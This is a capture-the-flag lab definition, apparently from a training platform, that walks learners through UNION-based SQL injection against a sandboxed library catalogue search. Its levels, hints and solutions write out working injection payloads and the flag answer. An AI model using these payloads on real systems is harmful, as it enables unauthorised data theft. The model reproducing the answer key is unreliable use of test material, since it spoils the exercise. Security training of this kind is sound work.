title: SQL Injection — UNION Data Extraction
description: Exploit a UNION-based SQL injection in a library catalogue search to pull a hidden flag out of a table the search was never meant to reach.
outcomes: Explain how UNION-based SQL injection differs from authentication-bypass injection.
Determine the number of columns a query returns using ORDER BY or NULL probing.
Craft a UNION SELECT payload to extract data from an unrelated database table.

levels.title: Introduction
levels.content:
# General information — please read carefully

* Each level builds on the previous one. Do not skip ahead.
* If you get stuck, use the hints — or search for the technique online.
* This exercise is for educational purposes only. Only attack systems within your sandbox.

# Storyline

You are a junior penetration tester at SecureWave Ltd. Your client, the **Athenaeum Digital Library**, runs a public book-catalogue search on its website. The developers insist the search is 'read-only, so it can't be dangerous'.

Read-only is not the same as safe. If the search builds its SQL by gluing your input into the query, you can bolt on your own `UNION SELECT` and read data from tables that have nothing to do with books — including a private librarian note that holds the flag.

levels.title: Get Access
levels.cloud_content:
SSH to your attacker machine at **10.1.33.23**, then reach the target catalogue:

```
curl 'http://10.1.33.10/search.php?q=sea'
```

The target server is at **10.1.33.10** (HTTP port 80). Do not attack anything outside this sandbox. Submit **start** to begin.
levels.local_content:
The target web application is running locally:

```
curl 'http://127.0.0.1/search.php?q=sea'
```

Or open http://127.0.0.1/search.php in a browser. Submit **start** to begin.

levels.title: Confirm the Injection Point
levels.content:
The catalogue search takes a `q` parameter:

```
curl 'http://10.1.33.10/search.php?q=sea'
```

As with any injection test, the first step is to break the query syntax. Inject a single quote into the search term and watch for a database error:

```
curl -G 'http://10.1.33.10/search.php' --data-urlencode "q='"
```

If the page returns a SQLite error instead of book results, the search is concatenating your input directly into the SQL statement — the query string literal is now unbalanced.

**What single character did you inject to trigger the database error?**
levels.solution:
```
$ curl -G 'http://10.1.33.10/search.php' --data-urlencode "q='"
...Database error: unrecognized token: ...'...
```

The single quote `'` breaks the `LIKE '%...%'` string literal and produces a syntax error, proving the input is not sanitised. The answer is **'**

hints.title: What breaks a SQL string?
hints.content: SQL string literals are wrapped in single quotes. Injecting one `'` unbalances the quotes and causes a syntax error if the input is not sanitised.

hints.title: How do I send it safely in curl?
hints.content: Use `curl -G ... --data-urlencode "q='"` so the quote is URL-encoded and reaches PHP intact.

levels.title: Count the Columns
levels.content:
To use `UNION SELECT`, your injected query must return **the same number of columns** as the original query — otherwise the database rejects it.

Find the column count with `ORDER BY`. Increase the number until you get an error:

```
curl -G 'http://10.1.33.10/search.php' --data-urlencode "q=x' ORDER BY 1 -- -"
curl -G 'http://10.1.33.10/search.php' --data-urlencode "q=x' ORDER BY 2 -- -"
curl -G 'http://10.1.33.10/search.php' --data-urlencode "q=x' ORDER BY 3 -- -"
```

`ORDER BY N` succeeds while column N exists and errors once N is too large. The largest N that does **not** error is the column count.

The catalogue shows a Title and an Author for each result — a strong hint about how many columns the query selects.

**How many columns does the search query return?**
levels.solution:
```
$ curl -G .../search.php --data-urlencode "q=x' ORDER BY 2 -- -"   # OK
$ curl -G .../search.php --data-urlencode "q=x' ORDER BY 3 -- -"   # Database error
```

`ORDER BY 2` works but `ORDER BY 3` errors, so the query returns **2** columns (title and author).

hints.title: What does ORDER BY N do?
hints.content: `ORDER BY N` sorts by the Nth column. If column N does not exist, the database throws an error. Increment N until the error appears; the last working value is the column count.

hints.title: What does the results table tell you?
hints.content: Each result row shows two fields: Title and Author. That maps directly to the number of columns the SELECT returns.

levels.title: UNION SELECT the Flag
levels.content:
You know the query returns **2 columns**. Now append a `UNION SELECT` that reads from the private `librarian_notes` table instead of `books`.

The flag is stored in the `note` column of `librarian_notes`. Your two-column UNION puts the note in the first column (rendered as a book Title) and a filler value in the second:

```
curl -G 'http://10.1.33.10/search.php' \
  --data-urlencode "q=' UNION SELECT note, 'x' FROM librarian_notes -- -"
```

Breaking the payload down:
* `'` closes the original `LIKE '%...` string.
* `UNION SELECT note, 'x' FROM librarian_notes` adds a row from the secret table.
* `-- -` comments out the trailing `%'` left over from the original query.

The flag appears in the results table where a book title would normally be.

**Submit the flag pulled from `librarian_notes`.**
levels.solution: ``` $ curl -G 'http://10.1.33.10/search.php' \ --data-urlencode "q=' UNION SELECT note, 'x' FROM librarian_notes -- -" ...WMG{un10n_b4s3d_sql1_l34ks_th3_db}x... ``` The UNION injects the secret note into the results as a fake book title.

hints.title: How many columns must UNION SELECT have?
hints.content: Exactly two — the same as the original query. Put the secret in one column and any filler (like `'x'`) in the other.

hints.title: Which table and column holds the flag?
hints.content: The flag is in the `note` column of the `librarian_notes` table: `UNION SELECT note, 'x' FROM librarian_notes`.

hints.title: Why -- - at the end?
hints.content: `-- ` starts a SQL comment (the trailing dash keeps it from being trimmed). It discards the leftover `%'` from the original `LIKE` clause so your injected query is syntactically valid.

levels.title: Feedback
levels.instructions: Please answer these questions to help us improve the game.

questions.text: How difficult did you find this game?
Had you performed a UNION-based SQL injection before this game?

choices.text: Yes, I was comfortable with it
I knew the theory but had not done it

questions.text: How clear were the level instructions?
What would you change or add to improve this game?
